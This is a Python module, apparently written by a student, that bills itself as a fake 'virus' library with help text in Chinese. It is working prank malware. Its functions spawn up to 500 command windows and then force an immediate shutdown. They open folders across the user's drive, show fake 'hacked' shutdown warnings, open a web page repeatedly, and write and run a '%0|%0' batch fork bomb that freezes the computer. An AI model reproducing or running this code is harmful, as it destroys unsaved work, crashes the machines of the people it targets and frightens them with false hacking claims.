import os,tkinter as tk
import webbrowser as w
from time import *
def help():
    print('宇宙假"病毒"库V2.0版提示信息')
    print('\033[1;31m慎用！少用！\033[0m')
    print('\n')
    print('导库方法from Virus import *或import Virus')
    print('Virus有个模块：viru')
    print('功能')
    print('Virus.viru.Vmain()(from导库你们知道，直接viru.Vmain())')
    print('照常会有提示，如敲代码Virus.viru.Vmain(False)或Virus.viru.Vmain(tips=False)，则没有')
    print('Virus.viru.re_shut()撤销关机')
    print('Virus.viru.shut(n,t)关机,n代表n秒后关机，可0秒;t代表警告内容，参数1整数型，2字符串')
    print('Virus.viru.openC()开C盘')
    print('Virus.viru.die_computer()直接黑屏掉')
    print('Virus.viru.nap()睡眠计算机')
    print('Virus.viru.Restart()重启计算机')
    print('Virus.file.https(url,times) url为打开网站，不用此参数则默认小轩个人主页，times打开次数，默认1次，打开1000次就是病毒了，卡死，慎用')
    print('Virus.file.cmd(times)打开cmd,times为打开次数，默认1次')
    print('超神[中文函数]')
    print('Virus.中文.cmd系列.完蛋()打开30次cmd并关机')
    print('Virus.中文.cmd系列.绝了()打开50次cmd并关机')
    print('Virus.中文.cmd系列.黑了()打开100次cmd并关机')
    print('Virus.中文.cmd系列.没了()打开200次cmd并关机')
    print('Virus.中文.cmd系列.死绝()打开500次cmd并关机')
    print('Virus.中文.版权()查看版权')
    print('Virus.中文.要命()开100次cmd,关机警告，撤销关机警告，开100次C盘，关机')
class viru(object):
    @classmethod
    def Vmain(cls,tips = True):
        if tips == True:
            print('请耐心关闭文件，然后会有精彩的病毒')
            print('若尝试，做好心理准备，倒计时2秒')
            sleep(2)
        root = tk.Tk()
        root.geometry('3000x3000')
        root.mainloop()
        a = 'start '+os.path.expanduser("~")
        os.system('start C:')
        os.system('start D:')
        os.system('start C:/Users')
        os.system(a)
        os.system(a+'/desktop')
        os.system(a+'/xueersi')
        os.system(a+'/下载')
        os.system(a+'/学而思直播')
        os.system(a+'/学而思直播/code/cache')
        os.system('start C:/AppData')
        os.system(a+'/Intel')
        os.system(a+'/Intel/Logs')
        sleep(2)
        os.system('shutdown/s /c 您的电脑已经被黑客入侵')
        sleep(2)
        os.system('shutdown/a')
        sleep(0.5)
        os.system('shutdown/s /c 360杀毒无效')
        sleep(10)
        os.system('shutdown/a')
        sleep(1)
        os.system('shutdown/s /t 0')
    
    @classmethod
    def re_shut(cls):
        os.system('shutdown/a')
    
    @classmethod
    def shut(cls,timed = 60,text = '60秒后关机'):
        os.system('shutdown/s /c '+text+' /t '+str(timed))
    
    @classmethod
    def nap(cls):
        os.system('shutdown/h')

    @classmethod
    def Restart(cls):
        os.system('shutdown/r')
        
    @classmethod
    def openC(cls):
        os.system('start C:')
    
    @classmethod
    def die_computer(cls):
        file = open('xxhp.bat','w')
        file.write('%0|%0')
        file.close()
        os.system('start xxhp.bat')
    
    @classmethod
    def nontry(cls):
        pass
    
class file(object):
    @classmethod
    def https(cls,url='https://code.xueersi.com/space/12907647',times=1):
        for i in range(times):
            w.open(url)
    
    @classmethod
    def cmd(cls,times=1):
        for i in range(times):
            os.system('start')

class 中文(object):
    @classmethod
    def 版权(cls):
        print('宇宙工作室室长小轩')
        print('@版权所有·侵权必究')
        print('此内容不可删，否则举报')
    @classmethod
    def 要命(cls):
        for i in range(100):
            os.system('start')
        sleep(2)
        os.system('shutdown/s /t 10')
        sleep(2)
        os.system('shutdown/a')
        sleep(2)
        for i in range(100):
            os.system('start C:')
        sleep(2)
        os.system('shutdown/s /t 0')
    class cmd系列(object):
        @classmethod
        def 完蛋(cls):
            for i in range(30):
                os.system('start')
            sleep(2)
            os.system('shutdown/s /t 0')
        @classmethod
        def 绝了(cls):
            for i in range(50):
                os.system('start')
            sleep(2)
            os.system('shutdown/s /t 0')
        @classmethod
        def 黑了(cls):
            for i in range(100):
                os.system('start')
            sleep(2)
            os.system('shutdown/s /t 0')
        @classmethod
        def 没了(cls):
            for i in range(200):
                os.system('start')
            sleep(2)
            os.system('shutdown/s /t 0')
        @classmethod
        def 死绝(cls):
            for i in range(500):
                os.system('start')
            sleep(2)
            os.system('shutdown/s /t 0')